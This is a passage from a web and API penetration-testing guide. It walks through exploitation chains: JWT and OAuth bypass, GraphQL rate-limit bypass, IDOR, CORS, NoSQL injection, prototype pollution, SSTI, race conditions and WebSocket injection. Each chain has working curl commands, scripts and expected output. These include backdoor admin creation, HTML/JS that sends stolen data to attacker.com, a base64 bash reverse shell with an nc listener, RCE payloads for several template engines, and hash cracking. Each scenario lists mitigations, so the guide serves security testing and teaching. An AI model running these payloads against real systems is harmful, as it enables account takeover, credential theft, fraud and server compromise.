  -H "Authorization: Bearer $MALICIOUS_JWT"

# Expected if vulnerable:
{
  "users": [
    {"id": 1, "username": "admin", "email": "admin@target.com"},
    {"id": 1234, "username": "user", "email": "user@example.com"}
  ]
}
# Admin endpoint accessed = Account takeover successful

# Step 5: Create new admin account
curl -X POST https://api.target.com/admin/users \
  -H "Authorization: Bearer $MALICIOUS_JWT" \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","password":"P@ssw0rd","role":"admin"}'

# Persistent admin access established
```

**Impact:** JWT signature bypass → Admin access → Complete account takeover

**Mitigation:**
- Reject tokens with "alg":"none"
- Always verify signature before processing
- Use strong signing algorithms (RS256, not HS256 with weak secrets)
- Implement token expiration and rotation
- Validate all claims (issuer, audience, expiration)

---

### Scenario 5: OAuth 2.0 Redirect URI Bypass to Account Takeover

```bash
# Step 1: Analyze OAuth flow
# User clicks "Login with Google" on https://target.com
# Redirected to:
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://target.com/oauth/callback&
  response_type=code&
  scope=email profile

# Step 2: Test redirect_uri parameter manipulation
# Try to change redirect_uri to attacker-controlled domain

# Test 1: Subdomain takeover
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://attacker.target.com/callback&
  response_type=code&
  scope=email profile

# Test 2: Open redirect on target domain
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://target.com/redirect?url=https://attacker.com&
  response_type=code&
  scope=email profile

# Test 3: Path traversal
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://target.com/oauth/callback/../../../attacker.com&
  response_type=code&
  scope=email profile

# Step 3: If redirect_uri validation is weak, authorization code is sent to attacker
# Attacker receives:
GET /callback?code=4/0AX4XfWh...
Host: attacker.com

# Step 4: Exchange authorization code for access token
curl -X POST https://target.com/oauth/token \
  -d "client_id=TARGET_CLIENT_ID&client_secret=TARGET_SECRET&code=4/0AX4XfWh...&redirect_uri=https://attacker.com/callback"

# Response:
{
  "access_token": "ya29.a0AfH6...",
  "token_type": "Bearer",
  "expires_in": 3600
}

# Step 5: Use stolen access token to access victim account
curl -X GET https://api.target.com/user/profile \
  -H "Authorization: Bearer ya29.a0AfH6..."

# Response:
{
  "email": "victim@example.com",
  "name": "Victim User",
  "id": 5678
}
# Account takeover complete
```

**Impact:** OAuth redirect_uri bypass → Authorization code theft → Account takeover

**Mitigation:**
- Strict redirect_uri whitelist (exact match, not prefix match)
- No wildcard redirect URIs
- Use state parameter (CSRF token)
- Implement PKCE for public clients
- Validate redirect_uri server-side

---

### Scenario 6: GraphQL Batching for Rate Limit Bypass

```bash
# Step 1: Identify GraphQL endpoint
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# Response:
{"data":{"__typename":"Query"}}

# Step 2: Test single password reset request (rate limited)
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { requestPasswordReset(email:\"victim@example.com\") { success } }"}'

# After 5 requests:
{"errors":[{"message":"Rate limit exceeded. Try again in 60 seconds."}]}

# Step 3: Bypass rate limiting using GraphQL batching (aliasing)
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation {
      req1: requestPasswordReset(email:\"victim@example.com\") { success }
      req2: requestPasswordReset(email:\"victim@example.com\") { success }
      req3: requestPasswordReset(email:\"victim@example.com\") { success }
      req4: requestPasswordReset(email:\"victim@example.com\") { success }
      req5: requestPasswordReset(email:\"victim@example.com\") { success }
      req6: requestPasswordReset(email:\"victim@example.com\") { success }
      req7: requestPasswordReset(email:\"victim@example.com\") { success }
      req8: requestPasswordReset(email:\"victim@example.com\") { success }
      req9: requestPasswordReset(email:\"victim@example.com\") { success }
      req10: requestPasswordReset(email:\"victim@example.com\") { success }
    }"
  }'

# Expected output (rate limit bypassed):
{
  "data": {
    "req1": {"success": true},
    "req2": {"success": true},
    "req3": {"success": true},
    ...
  }
}

# Step 4: Exploit for user enumeration (batch 1000 emails)
# Create script to test if users exist
cat > graphql_enum.py << 'EOF'
import requests
import json

emails = ["user1@example.com", "user2@example.com", ...] # 1000 emails

aliases = []
for i, email in enumerate(emails):
    aliases.append(f'req{i}: requestPasswordReset(email:"{email}") {{ success }}')

query = "mutation {" + "\n".join(aliases) + "}"
response = requests.post("https://api.target.com/graphql",
    json={"query": query})

# Parse results
data = response.json()["data"]
valid_emails = [email for i, email in enumerate(emails) if data[f"req{i}"]["success"]]
print(f"Found {len(valid_emails)} valid emails")
EOF

python3 graphql_enum.py
# Output: Found 347 valid emails
```

**Impact:** GraphQL batching → Rate limit bypass → User enumeration / DoS / Brute force

**Mitigation:**
- Implement query cost analysis (limit complexity)
- Disable batching/aliasing or limit batch size
- Rate limit per operation type (not just per request)
- Monitor for suspicious GraphQL queries
- Implement query depth limiting

---

### Scenario 7: IDOR Chain to Full Account Takeover

```bash
# Step 1: Discover basic IDOR (view other user's profile)
curl -X GET https://api.target.com/users/1234 \
  -H "Authorization: Bearer user_5678_token"

# Response (IDOR vulnerability):
{
  "id": 1234,
  "username": "victim",
  "email": "victim@example.com",
  "role": "user"
}

# Step 2: Test IDOR on update endpoint
curl -X PUT https://api.target.com/users/1234 \
  -H "Authorization: Bearer user_5678_token" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}'

# Response:
{"message":"Email updated successfully"}

# Step 3: Trigger password reset to attacker's email
curl -X POST https://api.target.com/password-reset \
  -d '{"email":"attacker@example.com"}'

# Password reset link sent to attacker@example.com

# Step 4: Complete password reset
# Check attacker email for reset link:
# https://target.com/reset-password?token=abc123...

curl -X POST https://target.com/reset-password \
  -d '{"token":"abc123...","new_password":"NewP@ssw0rd123"}'

# Response:
{"message":"Password reset successful"}

# Step 5: Login as victim with new password
curl -X POST https://api.target.com/login \
  -d '{"username":"victim","password":"NewP@ssw0rd123"}'

# Response:
{
  "token": "eyJhbGc...",  # Victim's JWT token
  "user_id": 1234
}
# Full account takeover complete
```

**Impact:** IDOR → Email change → Password reset → Complete account takeover

**Mitigation:**
- Validate user authorization for all object access
- Implement server-side access control checks
- Use UUIDs instead of sequential IDs
- Verify current password before email changes
- Send confirmation to old email when email is changed

---

### Scenario 8: CORS Misconfiguration to Credential Theft

```bash
# Step 1: Test CORS policy
curl -X GET https://api.target.com/user/profile \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer victim_token" \
  -v

# Response headers (vulnerable):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"email":"victim@example.com","api_key":"sk_live_abc123..."}

# Step 2: Create malicious website (attacker.com/steal.html)
cat > steal.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<script>
// Exploit CORS misconfiguration
fetch('https://api.target.com/user/profile', {
  credentials: 'include',  // Send cookies
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
})
.then(response => response.json())
.then(data => {
  // Send stolen data to attacker server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>
EOF

# Step 3: Victim visits attacker.com/steal.html
# If victim is logged into target.com, their credentials are stolen

# Step 4: Attacker receives stolen data
# On attacker.com/collect endpoint:
{
  "email": "victim@example.com",
  "api_key": "sk_live_abc123...",
  "credit_card_last4": "4242"
}

# Step 5: Use stolen API key
curl -X GET https://api.target.com/sensitive-data \
  -H "Authorization: Bearer sk_live_abc123..."
```

**Impact:** CORS misconfiguration → Credential theft → API key compromise

**Mitigation:**
- Whitelist specific origins (not wildcards or reflected origins)
- Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Validate Origin header server-side
- Use SameSite cookie attribute
- Implement CSRF tokens

---

### Scenario 9: API Key Leakage and Privilege Escalation

```bash
# Step 1: Discover API key in client-side code
# View page source on https://target.com
curl https://target.com/ | grep -i "api"

# Found in JavaScript:
const API_KEY = "pk_live_1234567890abcdef";  # Hardcoded API key
const API_URL = "https://api.target.com/v1";

# Step 2: Test API key permissions
curl -X GET https://api.target.com/v1/users \
  -H "Authorization: Bearer pk_live_1234567890abcdef"

# Response:
{
  "users": [
    {"id": 1, "name": "Admin User"},
    {"id": 2, "name": "Regular User"}
  ]
}

# Step 3: Discover API key has more permissions than expected
curl -X GET https://api.target.com/v1/admin/config \
  -H "Authorization: Bearer pk_live_1234567890abcdef"

# Response (privilege escalation):
{
  "database_url": "postgresql://admin:password@db.internal:5432/production",
  "aws_access_key": "AKIA...",
  "stripe_secret_key": "sk_live_..."
}

# Step 4: Extract database credentials
psql postgresql://admin:password@db.internal:5432/production

# Connected to production database
production=# SELECT * FROM users;
# Full database access

# Step 5: Use AWS credentials for lateral movement
aws s3 ls --profile stolen
# List all S3 buckets with compromised AWS key
```

**Impact:** API key exposure → Privilege escalation → Infrastructure compromise

**Mitigation:**
- Never hardcode API keys in client-side code
- Use environment variables for secrets
- Implement API key rotation
- Principle of least privilege (scope API keys tightly)
- Separate keys for different environments (dev, staging, prod)
- Monitor for leaked keys (GitHub scanning, GitGuardian)

---

### Scenario 10: Mass Assignment to Admin Access

```bash
# Step 1: Register new user account
curl -X POST https://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@example.com","password":"P@ssw0rd123"}'

# Response:
{
  "id": 9999,
  "username": "attacker",
  "email": "attacker@example.com",
  "role": "user"  # Default role
}

# Step 2: Test mass assignment vulnerability
# Try adding "role":"admin" to registration request
curl -X POST https://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_attacker","email":"admin@attacker.com","password":"P@ssw0rd123","role":"admin"}'

# Response (mass assignment vulnerability):
{
  "id": 10000,
  "username": "admin_attacker",
  "email": "admin@attacker.com",
  "role": "admin"  # Attacker-supplied role accepted!
}

# Step 3: Login with admin account
curl -X POST https://api.target.com/login \
  -d '{"username":"admin_attacker","password":"P@ssw0rd123"}'

# Response:
{
  "token": "eyJhbGc...",  # JWT with admin role
  "role": "admin"
}

# Step 4: Access admin functionality
curl -X GET https://api.target.com/admin/users \
  -H "Authorization: Bearer eyJhbGc..."

# Response:
{
  "users": [...]  # All users including sensitive data
}

# Step 5: Create additional admin accounts for persistence
curl -X POST https://api.target.com/admin/users \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"username":"backdoor","password":"P@ssw0rd123","role":"admin"}'
```

**Impact:** Mass assignment → Admin privilege → Complete system access

**Mitigation:**
- Whitelist allowed fields (never blindly accept all input)
- Use DTOs (Data Transfer Objects) with explicit field mapping
- Separate internal fields (role, isAdmin) from user input
- Validate and sanitize all input
- Use ORM frameworks with protected attributes

---

### Scenario 11: NoSQL Injection to Database Dump

```bash
# Step 1: Identify MongoDB-backed application
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# Step 2: Test NoSQL injection (bypass authentication)
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Response (authentication bypassed):
{
  "token": "eyJhbGc...",
  "username": "admin",  # First user in database (often admin)
  "role": "administrator"
}

# Step 3: Enumerate users using $regex
curl -X POST https://api.target.com/users/search \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"username":{"$regex":"^a"}}'

# Response:
[
  {"username":"admin","email":"admin@target.com"},
  {"username":"alice","email":"alice@target.com"}
]

# Step 4: Extract password hashes using $where (if enabled)
curl -X POST https://api.target.com/users/search \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"$where":"this.password.length > 0"}'

# Response:
[
  {"username":"admin","password":"$2b$10$abcdef...","email":"admin@target.com"},
  {"username":"alice","password":"$2b$10$ghijkl...","email":"alice@target.com"}
]

# Step 5: Crack password hashes offline
cat > hashes.txt << EOF
$2b$10$abcdef...
$2b$10$ghijkl...
EOF

hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Cracked:
$2b$10$abcdef...:Admin123
$2b$10$ghijkl...:password
```

**Impact:** NoSQL injection → Authentication bypass → Database dump → Password cracking

**Mitigation:**
- Validate input types (reject objects when expecting strings)
- Sanitize all user input
- Disable dangerous MongoDB operators ($where, $function)
- Use parameterized queries
- Implement rate limiting on login attempts
- Hash passwords with strong algorithms (bcrypt with high work factor)

---

### Scenario 12: Prototype Pollution to XSS/RCE

```bash
# Step 1: Identify Node.js/JavaScript application
curl https://target.com -v | grep "X-Powered-By"
# X-Powered-By: Express

# Step 2: Test for prototype pollution
curl -X POST https://api.target.com/user/preferences \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer user_token" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Step 3: Verify pollution (check if prototype was modified)
curl -X GET https://api.target.com/user/profile \
  -H "Authorization: Bearer user_token"

# Response includes polluted property:
{
  "username": "user",
  "email": "user@example.com",
  "polluted": "yes"  # Prototype pollution confirmed
}

# Step 4: Escalate to XSS via prototype pollution
curl -X POST https://api.target.com/user/preferences \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer user_token" \
  -d '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'

# When victim views profile:
# XSS payload executes

# Step 5: Escalate to RCE (server-side prototype pollution)
# If application uses child_process or eval:
curl -X POST https://api.target.com/user/preferences \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer user_token" \
  -d '{"__proto__":{"execPath":"/bin/bash","execArgv":["-c","curl http://attacker.com/pwned"]}}'

# Alternative RCE payload (template rendering):
curl -X POST https://api.target.com/user/preferences \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").exec(\"curl http://attacker.com/pwned\")//"}}'
```

**Impact:** Prototype pollution → XSS or RCE → Full application compromise

**Mitigation:**
- Use `Object.create(null)` to create objects without prototype
- Freeze prototypes: `Object.freeze(Object.prototype)`
- Input validation (reject `__proto__`, `constructor`, `prototype` keys)
- Use Map instead of plain objects for user input
- Update vulnerable libraries (lodash, jQuery, etc.)
- Use `--disable-proto=delete` flag in Node.js (v18.3.0+)

---

### Scenario 13: Server-Side Template Injection (SSTI) to RCE

```bash
# Step 1: Identify template engine
# Test basic SSTI payloads in input fields
curl -X POST https://target.com/greet \
  -d "name={{7*7}}"

# Response:
Hello, 49!  # Template evaluated = SSTI confirmed

# Step 2: Identify template engine type
# Jinja2 (Python):
curl -X POST https://target.com/greet \
  -d "name={{config}}"

# Response includes Flask config = Jinja2 confirmed

# Step 3: Exploit Jinja2 SSTI for RCE
curl -X POST https://target.com/greet \
  -d 'name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Response:
Hello, uid=33(www-data) gid=33(www-data) groups=33(www-data)!

# Step 4: Escalate to reverse shell
# Base64 encode reverse shell to avoid escaping issues
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx

curl -X POST https://target.com/greet \
  -d 'name={{config.__class__.__init__.__globals__["os"].popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx|base64 -d|bash").read()}}'

# On attacker machine:
nc -lvp 4444
# Reverse shell obtained

# Step 5: Alternative SSTI payloads for other engines:

# Twig (PHP):
curl -X POST https://target.com/greet \
  -d 'name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'

# Freemarker (Java):
curl -X POST https://target.com/greet \
  -d 'name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'

# Velocity (Java):
curl -X POST https://target.com/greet \
  -d 'name=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'
```

**Impact:** SSTI → Remote Code Execution → Server compromise

**Mitigation:**
- Never pass user input directly to template engines
- Use sandboxed template engines
- Implement strict input validation
- Use logic-less templates (Mustache)
- Escape user input before rendering
- Review template code during security audits

---

### Scenario 14: Race Condition in Payment Flow

```bash
# Step 1: Identify payment processing endpoint
curl -X POST https://api.target.com/purchase \
  -H "Authorization: Bearer user_token" \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"amount":100.00}'

# Response:
{
  "order_id": "order_12345",
  "amount": 100.00,
  "status": "pending"
}

# Step 2: Test for race condition
# Send multiple simultaneous purchase requests
for i in {1..10}; do
  curl -X POST https://api.target.com/purchase \
    -H "Authorization: Bearer user_token" \
    -H "Content-Type: application/json" \
    -d '{"item_id":123,"quantity":1,"amount":100.00}' &
done
wait

# Check account balance:
curl -X GET https://api.target.com/balance \
  -H "Authorization: Bearer user_token"

# Expected (vulnerable):
{
  "balance": 900.00,  # Only charged once!
  "orders": [
    "order_12345",
    "order_12346",
    ...
    "order_12354"  # 10 orders created
  ]
}

# Step 3: Exploit race condition in refund flow
# Purchase item
curl -X POST https://api.target.com/purchase \
  -d '{"item_id":456,"amount":500.00}' \
  -H "Authorization: Bearer user_token"

# Send multiple simultaneous refund requests
for i in {1..20}; do
  curl -X POST https://api.target.com/refund \
    -d '{"order_id":"order_12355"}' \
    -H "Authorization: Bearer user_token" &
done
wait

# Check balance:
{
  "balance": 10000.00  # Refunded 20 times!
}

# Step 4: Automate exploitation with parallel requests
cat > race_exploit.py << 'EOF'
import requests
import threading

def purchase():
    requests.post("https://api.target.com/purchase",
        headers={"Authorization": "Bearer user_token"},
        json={"item_id": 789, "amount": 1000.00})

# Launch 50 simultaneous requests
threads = []
for i in range(50):
    t = threading.Thread(target=purchase)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Check how many succeeded
balance = requests.get("https://api.target.com/balance",
    headers={"Authorization": "Bearer user_token"})
print(balance.json())
EOF

python3 race_exploit.py
```

**Impact:** Race condition → Duplicate orders → Financial loss / Free items

**Mitigation:**
- Use database transactions with proper isolation levels
- Implement idempotency keys (unique request IDs)
- Use database locks (SELECT FOR UPDATE)
- Implement request deduplication
- Add server-side request throttling
- Use optimistic locking with version numbers

---

### Scenario 15: WebSocket Message Injection

```bash
# Step 1: Connect to WebSocket endpoint
wscat -c wss://api.target.com/chat

# Connected to chat application

# Step 2: Send normal message
> {"type":"message","content":"Hello world"}

# Broadcasted to all users:
< {"user":"attacker","message":"Hello world"}

# Step 3: Test for message injection (XSS)
> {"type":"message","content":"<img src=x onerror=alert(1)>"}

# If vulnerable, XSS executes in all connected clients

# Step 4: Test for command injection
> {"type":"admin_command","command":"kick_user","user_id":"victim_123"}

# If authorization not checked:
< {"status":"success","message":"User victim_123 has been kicked"}

# Step 5: Exploit for privilege escalation
> {"type":"system","action":"promote","user":"attacker","role":"admin"}

# Check if role was updated:
> {"type":"message","content":"test"}
< {"user":"attacker","role":"admin","message":"test"}

# Step 6: Advanced exploitation (command injection via WebSocket)
# If server processes messages with eval() or exec():
> {"type":"eval","code":"process.mainModule.require('child_process').exec('curl http://attacker.com/pwned')"}

# Or SQL injection via WebSocket:
> {"type":"search","query":"' OR 1=1--"}

# Response includes all database records

# Step 7: Automated WebSocket fuzzing
cat > ws_fuzz.py << 'EOF'
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    payloads = [
        {"type":"admin","action":"list_users"},
        {"type":"message","content":"<script>alert(1)</script>"},
        {"type":"eval","code":"1+1"},
        {"user_id":{"$ne":null}},  # NoSQL injection
        {"type":"../../../etc/passwd"}  # Path traversal
    ]

    for payload in payloads:
        ws.send(json.dumps(payload))

ws = websocket.WebSocketApp("wss://api.target.com/chat",
    on_message=on_message,
    on_open=on_open)

ws.run_forever()
EOF

python3 ws_fuzz.py
```

**Impact:** WebSocket injection → XSS / Command injection / Privilege escalation

**Mitigation:**
- Validate and sanitize all WebSocket messages
- Implement authentication and authorization per message
- Use message type whitelisting
- Escape output before broadcasting to clients
- Implement rate limiting on WebSocket connections
- Use secure WebSocket libraries (socket.io with proper config)
- Never use eval() or exec() on user input

---

## Web/API Testing Scope Categories

### Traditional Web Application Testing

**Objective:** Assess security of server-rendered web applications

**Common Targets:**
- Server-side rendered applications (PHP, Python, Ruby, Java)
- Multi-page applications (MPAs)
- Content management systems (WordPress, Drupal, Joomla)
- E-commerce platforms (Magento, WooCommerce, Shopify)
- Corporate websites and portals

**Key Testing Areas:**
- Traditional OWASP Top 10 vulnerabilities
- Session management (cookies, session IDs)
- Server-side input validation
- Authentication and authorization flows
- File upload vulnerabilities
- Server-side template injection
- Business logic flaws

**Tools:**
- Reaper (traffic analysis and endpoint discovery)
- Nuclei (comprehensive vulnerability scanning with templates)
- Nikto (web server scanning)
- WPScan (WordPress-specific)
- SQLMap (SQL injection)
- ffuf (directory and parameter fuzzing)

---

### RESTful API Testing

**Objective:** Security assessment of REST APIs

**Common Targets:**
- JSON/XML-based REST APIs
- Mobile backend APIs
- Microservices architectures
- Third-party API integrations
- Public and private APIs

**Key Testing Areas:**
- API authentication (JWT, OAuth 2.0, API keys)
- Authorization bypass (BOLA/IDOR)
- Mass assignment vulnerabilities
- Rate limiting and resource consumption
- API versioning security
- Excessive data exposure
- Input validation and injection
- Business logic in API workflows

**Tools:**
- Reaper (traffic capture and API endpoint discovery via proxy)
- curl (API request testing and manipulation)
- ffuf (endpoint fuzzing and discovery)
- Arjun (parameter discovery)
- jwt_tool (JWT security testing and manipulation)
- Nuclei (API-specific vulnerability templates)

**OWASP API Top 10 Focus:**
- API1: Broken Object Level Authorization
- API2: Broken Authentication
- API3: Broken Object Property Level Authorization
- API5: Broken Function Level Authorization

---

### GraphQL API Testing

**Objective:** Security testing of GraphQL endpoints

**Common Targets:**
- GraphQL APIs (public and internal)
- Mobile app GraphQL backends
- Real-time applications using GraphQL subscriptions
- Federated GraphQL gateways

**Key Testing Areas:**
- Introspection enabled (schema disclosure)
- Query depth/complexity limits (DoS)
- Batching attacks (rate limit bypass)
- Field-level authorization bypass
- Injection via GraphQL variables
- Mutation abuse (unauthorized writes)
- Subscription hijacking

**Specific Vulnerabilities:**
- Introspection query disclosure
- Circular query DoS
- Batch query rate limit bypass
- Directive overloading
- Alias-based complexity bypass

**Tools:**
- curl (GraphQL query testing and introspection)
- Nuclei (GraphQL-specific templates for automated testing)
- Reaper (GraphQL traffic capture and endpoint discovery)

**Testing Commands:**
```bash
# Test introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Batch attack test
curl -X POST https://api.target.com/graphql \
  -d '{"query":"mutation { a1:resetPassword(email:\"test1@example.com\") a2:resetPassword(email:\"test2@example.com\") }"}'
```

---

### WebSocket Testing

**Objective:** Real-time communication protocol security

**Common Targets:**
- Chat applications
- Real-time dashboards
- Collaborative editing tools
- Live notifications
- Gaming platforms
- Trading platforms

**Key Testing Areas:**
- Authentication bypass (initial handshake)
- Message injection and manipulation
- Authorization per message (not just connection)
- Cross-Site WebSocket Hijacking (CSWSH)
- Origin validation bypass
- Message flooding (DoS)
- Injection via WebSocket messages (XSS, SQLi)

**Specific Vulnerabilities:**
- Missing origin validation
- Lack of authentication after handshake
- Message-level authorization bypass
- XSS via broadcasted messages
- Command injection via WebSocket

**Tools:**
- wscat (command-line WebSocket client)
- Python websocket-client library (programmatic WebSocket testing)
- Reaper (WebSocket traffic capture if proxied)
- curl (WebSocket handshake testing with --http1.1 upgrade)

**Testing Commands:**
```bash
# Connect to WebSocket
wscat -c wss://api.target.com/chat

# Test message injection
> {"type":"message","content":"<script>alert(1)</script>"}

# Test authorization bypass
> {"type":"admin","action":"delete_user","user_id":123}
```

---

### Single Page Application (SPA) Testing

**Objective:** Client-heavy JavaScript application security

**Common Targets:**
- React/Vue/Angular applications
- Progressive Web Apps (PWAs)
- Client-side rendered dashboards
- Modern web applications

**Key Testing Areas:**
- Client-side authentication bypass
- Local storage/session storage secrets
- Exposed API keys in JavaScript
- DOM-based XSS
- Client-side routing bypass
- Insecure direct object references
- Source map exposure (debugging info)
- Hardcoded credentials in bundled JS

**Specific Vulnerabilities:**
- API keys in JavaScript bundles
- JWT tokens in localStorage (XSS risk)
- Client-side validation only
- Sensitive business logic in client code
- Prototype pollution (JavaScript)
- Postmessage vulnerabilities

**Tools:**
- Browser DevTools (Network, Sources, Storage tabs)
- Reaper (proxy traffic and JavaScript resource capture)
- Retire.js (vulnerable JavaScript libraries)
- JSFinder (endpoint discovery in JS files)
- curl/wget (JavaScript file extraction and analysis)

**Testing Workflow:**
```bash
# Extract JavaScript files
wget https://app.target.com
grep -oP 'src="[^"]+\.js"' index.html | cut -d'"' -f2 > js-files.txt

# Search for API keys and secrets
for file in $(cat js-files.txt); do
  curl "https://app.target.com/$file" | grep -E "(api[_-]?key|secret|token|password|Bearer)" -i
done

# Check for exposed source maps
curl https://app.target.com/static/js/main.js.map

# Find API endpoints in JavaScript
curl https://app.target.com/static/js/main.js | grep -oP 'https?://[^"]+' | sort -u
```

---

## Modern API Protocols

### WebSockets Security Testing

**Protocol Overview:**
- Full-duplex communication over single TCP connection
- Upgrade from HTTP via handshake
- Real-time bidirectional messaging

**Security Testing Focus:**

1. **Handshake Authentication**
```bash
# Test missing authentication in upgrade request
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: test" \
  https://target.com/ws

# Expected secure response:
HTTP/1.1 401 Unauthorized
```

2. **Origin Validation**
```bash
# Test origin validation bypass
wscat -c wss://target.com/chat -H "Origin: https://attacker.com"

# If connection succeeds = Origin validation bypass
```

3. **Message-Level Authorization**
```javascript
// Test if authorization checked per message
ws.send(JSON.stringify({
  type: "admin_action",
  action: "delete_user",
  user_id: 123
}));
// Should fail if user is not admin
```

**Common Vulnerabilities:**
- Cross-Site WebSocket Hijacking (CSWSH)
- Missing rate limiting (message flooding)
- Injection in broadcasted messages
- Lack of message authentication

---

### gRPC Security Testing

**Protocol Overview:**
- Google's RPC framework using Protocol Buffers
- HTTP/2 transport
- Strongly typed service definitions

**Security Testing Focus:**

1. **Service Enumeration**
```bash
# List gRPC services (if reflection enabled)
grpcurl -plaintext target.com:50051 list

# Expected output (if reflection enabled):
grpc.reflection.v1alpha.ServerReflection
com.example.UserService
com.example.AdminService
```

2. **Protobuf Manipulation**
```bash
# Describe service methods
grpcurl -plaintext target.com:50051 describe com.example.UserService

# Invoke method with modified fields
grpcurl -plaintext -d '{"user_id": 1, "role": "admin"}' \
  target.com:50051 com.example.UserService.UpdateUser
```

3. **Authorization Testing**
```bash
# Test if admin methods accessible without auth
grpcurl -plaintext -d '{"user_id": 123}' \
  target.com:50051 com.example.AdminService.DeleteUser

# Should return: "Unauthenticated" or "Permission denied"
```

**Common Vulnerabilities:**
- Enabled gRPC reflection (info disclosure)
- Missing method-level authorization
- Deserialization issues in protobuf
- Unencrypted gRPC (plaintext)

**Tools:**
- grpcurl (command-line gRPC client) [MISSING - need to add]
- curl (with --http2 flag for basic HTTP/2 testing)
- Reaper (can capture HTTP/2 traffic if proxied)

---

### Server-Sent Events (SSE) Testing

**Protocol Overview:**
- Uni-directional (server to client) push
- HTTP-based (easier than WebSockets)
- Auto-reconnect support

**Security Testing Focus:**

1. **Authentication Bypass**
```bash
# Test SSE endpoint without authentication
curl -N -H "Accept: text/event-stream" https://target.com/events

# Expected secure response:
HTTP/1.1 401 Unauthorized
```

2. **Information Disclosure**
```bash
# Subscribe to event stream and monitor
curl -N -H "Accept: text/event-stream" \
  -H "Authorization: Bearer user_token" \
  https://target.com/events

# Check if sensitive data from other users is broadcasted
```

3. **CSRF via SSE**
```html
<!-- Malicious page forcing SSE subscription -->
<script>
const evtSource = new EventSource("https://target.com/admin/events", {
  withCredentials: true
});
evtSource.onmessage = (event) => {
  // Steal admin data sent via SSE
  fetch('https://attacker.com/collect', {method: 'POST', body: event.data});
};
</script>
```

**Common Vulnerabilities:**
- Missing authentication on SSE endpoints
- Broadcasting sensitive data without filtering
- CSRF attacks via EventSource
- Information leakage in error messages

---

### HTTP/2 and HTTP/3 Vulnerabilities

**HTTP/2 Specific:**

1. **Request Smuggling**
```bash
# HTTP/2 allows multiple requests in single connection
# Test for request smuggling via conflicting Content-Length and :path

curl --http2 -X POST https://target.com/api \
  -H "Content-Length: 10" \
  -H ":path: /api/admin" \
  -d "smuggled=data"
```

2. **Header Injection**
```bash
# HTTP/2 pseudo-headers can be manipulated
# Test :authority, :method, :path, :scheme injection
```

**HTTP/3 Specific (QUIC):**

1. **0-RTT Replay Attacks**
```bash
# HTTP/3 allows 0-RTT for faster connections
# Replay sensitive requests (e.g., payments)
# Server should implement replay protection
```

2. **Connection Migration Abuse**
```bash
# QUIC allows connection migration (IP address change)
# Test if session tied to connection or IP
```

**Common Vulnerabilities:**
- HTTP/2 request smuggling
- Header injection via pseudo-headers
- 0-RTT replay attacks (HTTP/3)
- Lack of ALPN negotiation validation

**Tools:**
- curl (with --http2 or --http3 flags for HTTP/2 and HTTP/3 testing)
- h2c (HTTP/2 client) [MISSING - need to add for advanced HTTP/2 testing]
- Reaper (can capture HTTP/2 and HTTP/3 traffic)

---

## Bug Bounty Workflows

### Automated Reconnaissance

**Objective:** Discover and map attack surface efficiently

**Subdomain Enumeration:**
```bash
# Passive subdomain discovery
subfinder -d target.com -o subdomains.txt

# DNS resolution and filtering
